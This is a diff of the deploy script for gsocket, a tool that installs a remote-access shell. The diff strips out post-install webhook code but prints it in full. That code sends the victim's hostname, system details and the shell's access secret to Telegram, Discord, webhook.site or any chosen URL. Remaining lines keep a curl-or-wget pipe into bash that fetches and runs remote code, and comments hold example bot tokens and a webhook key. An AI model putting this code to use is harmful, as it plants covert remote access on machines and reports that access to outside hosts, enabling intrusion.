@@ -46,15 +46,9 @@
 #       - Set to GS_HIDDEN_NAME if GS_HIDDEN_NAME is specified.
 # GS_DL=wget
 #       - Command to use for download. =wget or =curl.
-# GS_TG_TOKEN=
 #       - Telegram Bot ID, =5794110125:AAFDNb...
-# GS_TG_CHATID=
 #       - Telegram Chat ID, =-8834838...
-# GS_DISCORD_KEY=
 #       - Discord API key, ="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
-# GS_WEBHOOK_KEY=
-#       - https://webhook.site key, ="dc3c1af9-ea3d-4401-9158-eb6dda735276"
-# GS_WEBHOOK=
 #       - Generic webhook, ="https://foo.blah/log.php?s=\${GS_SECRET}"
 # GS_HOST=
 #       - IP or HOSTNAME of the GSRN-Server. Default is to use THC's infrastructure.
@@ -78,45 +72,6 @@ URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
 	URL_BIN_FULL="$URL_BIN"
 }
 [[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}" || URL_DEPLOY="${URL_BASE_X}/y"
-
-# STUBS for deploy_server.sh to fill out:
-gs_deploy_webhook=
-GS_WEBHOOK_404_OK=
-[[ -n $gs_deploy_webhook ]] && GS_WEBHOOK="$gs_deploy_webhook"
-unset gs_deploy_webhook
-
-# WEBHOOKS are executed after a successfull install
-# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
-msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
-### Telegram
-# GS_TG_TOKEN="5794110125:AAFDNb..."
-# GS_TG_CHATID="-8834838..."
-[[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
-	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
-	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
-}
-### Generic URL as webhook (any URL)
-[[ -n $GS_WEBHOOK ]] && {
-	GS_WEBHOOK_CURL=("$GS_WEBHOOK")
-	GS_WEBHOOK_WGET=("$GS_WEBHOOK")
-}
-### webhook.site
-# GS_WEBHOOK_KEY="dc3c1af9-ea3d-4401-9158-eb6dda735276"
-[[ -n $GS_WEBHOOK_KEY ]] && {
-	# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
-	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "gs-netcat -i -s ${GS_SECRET}"}'
-	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
-	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
-}
-### discord webhook
-# GS_DISCORD_KEY="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
-[[ -n $GS_DISCORD_KEY ]] && {
-	data='{"username": "gsocket", "content": "'"${msg}"'"}'
-	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
-	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
-}
-unset data
-unset msg
 
 DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
@@ -1465,50 +1420,6 @@ test_network()
 	WARN_EXECFAIL_SET "$ret" "default pkg failed"
 }
 
-do_webhook()
-{
-	local arr
-	local IFS
-	local str
-
-	IFS=""
-	# Expand any $SECRET variable, etc.
-	while [[ $# -gt 0 ]]; do
-		# We need to escape all " to "'"'" to pass 'eval' correctly.
-		# (Note: This _WILL_ expand $-style variables - what we want)
-		# shellcheck disable=SC2001 # Use bash.4.0 features =>  not portable
-		# str=$(echo "$1" | sed "s/\x22/\x22'\x22'\x22/g")
-		str="${1//\"/\"'\"'\"}"
-        eval str=\""$str"\"
-		arr+=("$str")
-		shift 1
-	done
-
-	# echo "arr=${#arr[@]}: ${arr[@]}"
-	"${arr[@]}"
-}
-
-webhooks()
-{
-	local arr
-	local ok
-	local err
-
-	echo -en "Executing webhooks...................................................."
-	[[ -z ${GS_WEBHOOK_CURL[0]} ]] && { SKIP_OUT; return; }
-	[[ -z ${GS_WEBHOOK_WGET[0]} ]] && { SKIP_OUT; return; }
-
-	if [[ -n $IS_USE_CURL ]]; then
-		err="$(do_webhook "${DL[@]}" "${GS_WEBHOOK_CURL[@]}" 2>&1)" && ok=1
-		[[ -z $ok ]] && [[ -n $GS_WEBHOOK_404_OK ]] && [[ "${err}" == *"requested URL returned error: 404"* ]] && ok=1
-	elif [[ -n $IS_USE_WGET ]]; then
-		err="$(do_webhook "${DL[@]}" "${GS_WEBHOOK_WGET[@]}" 2>&1)" && ok=1
-		[[ -z $ok ]] && [[ -n $GS_WEBHOOK_404_OK ]] && [[ "${err}" == *"ERROR 404: Not Found"* ]] && ok=1
-	fi
-	[[ -n $ok ]] && { OK_OUT; return; }
-
-	FAIL_OUT
-}
 
 try_network()
 {
@@ -1697,7 +1608,6 @@ fi
 	
 [[ -n $IS_DSTBIN_CWD ]] && WARN "Installed to ${PWD}. Try GS_DSTDIR= otherwise.."
 
-webhooks
 
 HOWTO_CONNECT_OUT
 
